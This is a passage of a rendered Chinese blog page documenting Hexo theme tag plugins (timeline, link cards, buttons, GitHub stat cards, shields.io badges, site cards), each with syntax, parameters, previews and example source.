page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></p></div><div class="body"><p>不需要额外处理。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></p></div><div class="body"><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="timeline-3"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% timeline %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) %&#125;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="链接卡片-link"><a href="#链接卡片-link" class="headerlink" title="链接卡片 link"></a>链接卡片 link</h1><div class="tabs" id="link"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#link-1">标签语法</button></li><li class="tab active"><button type="button" data-href="#link-2">样式预览</button></li><li class="tab"><button type="button" data-href="#link-3">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="link-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="link-2"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Akilarlxh/akilarlxh.github.io/img/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="link-3"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.jsdelivr.net/gh/Akilarlxh/akilarlxh.github.io/img/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="按钮-btns"><a href="#按钮-btns" class="headerlink" title="按钮 btns"></a>按钮 btns</h1><div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p><code>Volantis</code>的按钮使用的是<code>btn</code>和<code>btns</code>标签。<code>btns</code>和<code>butterfly</code>的<code>button</code>不冲突，但是<code>btn</code>会被强制渲染，导致部分参数失效,而且<code>btn</code>的效果还是<code>butterfly</code>的<code>button</code>更好看些。所以就只适配了<code>btns</code>。</p></div><div class="tabs" id="btn"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#btn-1">标签语法</button></li><li class="tab"><button type="button" data-href="#btn-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#btn-3">样式预览</button></li><li class="tab"><button type="button" data-href="#btn-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="btn-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="btn-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;标题&lt;/b&gt;</code>和<code>&lt;p&gt;描述文字&lt;/p&gt;</code></li><li>布局方式：<br> 默认为自动宽度，适合视野内只有一两个的情况。</li></ol><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">wide</td><td style="text-align:left">宽一点的按钮</td></tr><tr><td style="text-align:left">fill</td><td style="text-align:left">填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td style="text-align:left">center</td><td style="text-align:left">居中，按钮之间是固定间距</td></tr><tr><td style="text-align:left">around</td><td style="text-align:left">居中分散</td></tr><tr><td style="text-align:left">grid2</td><td style="text-align:left">等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td style="text-align:left">grid3</td><td style="text-align:left">等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td style="text-align:left">grid4</td><td style="text-align:left">等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td style="text-align:left">grid5</td><td style="text-align:left">等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="btn-3"><ol><li><p>如果需要显示类似「团队成员」之类的一组含有头像的链接：</p><div class="btns circle grid5">         <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>       </div></li><li><p>或者含有图标的按钮：</p><div class="btns rounded grid5">         <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>       </div></li><li><p>圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><div class="btns circle center grid5">         <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'><i class='fab fa-apple'></i><b>心率管家</b><p class='p red'>专业版</p><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'><i class='fab fa-apple'></i><b>心率管家</b><p class='p green'>免费版</p><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_lite.png'></a>       </div></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="btn-4"><ol><li>如果需要显示类似「团队成员」之类的一组含有头像的链接：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure></li><li>或者含有图标的按钮：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure></li><li>圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="github卡片-ghcard"><a href="#github卡片-ghcard" class="headerlink" title="github卡片 ghcard"></a>github卡片 ghcard</h1><div class="note blue icon modern"><i class="note-icon fas fa-bullhorn"></i><p>ghcard使用了<code>github-readme-stats</code>的API，支持直接使用markdown语法来写。</p></div><div class="tabs" id="ghcard"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#ghcard-1">标签语法</button></li><li class="tab"><button type="button" data-href="#ghcard-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#ghcard-3">样式预览</button></li><li class="tab"><button type="button" data-href="#ghcard-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="ghcard-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="ghcard-2"><p>更多参数可以参考：<br><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/anuraghazra/github-readme-stats"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=anuraghazra&repo=github-readme-stats&show_owner=true"/></a><br>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><div class="table-container"><table><thead><tr><th style="text-align:left">参数名</th><th style="text-align:left">取值</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:left">hide</td><td style="text-align:left">stars,commits,prs,issues,contribs</td><td style="text-align:left">隐藏指定统计</td></tr><tr><td style="text-align:left">count_private</td><td style="text-align:left">true</td><td style="text-align:left">将私人项目贡献添加到总提交计数中</td></tr><tr><td style="text-align:left">show_icons</td><td style="text-align:left">true</td><td style="text-align:left">显示图标</td></tr><tr><td style="text-align:left">theme</td><td style="text-align:left">请查阅<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td style="text-align:left">主题</td></tr></tbody></table></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="ghcard-3"><ol><li>用户信息卡片</li></ol><div class="table-container"><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=calm&show_owner=true"/></a></td></tr></tbody></table></div><ol><li>仓库信息卡片</li></ol><div class="table-container"><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="ghcard-4"><ol><li><p>用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">| &#123;% ghcard xaoxuu %&#125; | &#123;% ghcard xaoxuu, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard xaoxuu, theme=buefy %&#125; | &#123;% ghcard xaoxuu, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard xaoxuu, theme=onedark %&#125; | &#123;% ghcard xaoxuu, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard xaoxuu, theme=algolia %&#125; | &#123;% ghcard xaoxuu, theme=calm %&#125; |</span><br></pre></td></tr></table></figure></li><li><p>仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="github徽标-ghbdage"><a href="#github徽标-ghbdage" class="headerlink" title="github徽标 ghbdage"></a>github徽标 ghbdage</h1><div class="tip cogs"><p>关于ghbdage参数的更多具体用法可以参看相关教程：<a href="https://akilar.top/posts/e87ad7f8">添加github徽标</a></p></div><div class="tabs" id="ghbdage"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#ghbdage-1">标签语法</button></li><li class="tab"><button type="button" data-href="#ghbdage-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#ghbdage-3">样式预览</button></li><li class="tab"><button type="button" data-href="#ghbdage-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="ghbdage-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="ghbdage-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="ghbdage-3"><p><div class="note info modern"><p>本外挂标签的参数分为三组，用<code>||</code>分割。</p></div></p><ol><li>基本参数<br><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></li><li>信息参数<br><br><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></li><li>拓展参数<br><br><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=40"></object><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=40&logoColor=violet"></object></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="ghbdage-4"><p><div class="note info modern"><p>本外挂标签的参数分为三组，用<code>||</code>分割。</p></div></p><ol><li>基本参数,定义徽标左右文字和图标<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure></li><li>信息参数，定义徽标右侧内容背景色，指向链接<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure></li><li>拓展参数，支持shields的API的全部参数内容<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="网站卡片-sites"><a href="#网站卡片-sites" class="headerlink" title="网站卡片 sites"></a>网站卡片 sites</h1><div class="tabs" id="site"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#site-1">标签语法</button></li><li class="tab active"><button type="button" data-href="#site-2">样式预览</button></li><li class="tab"><button type="button" data-href="#site-3">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="site-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="site-2"><div class="site-card-group"><a class="site-card" href="https://xaoxuu.com"><div class="img"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png"/><span class="title">xaoxuu</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="site-3"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, 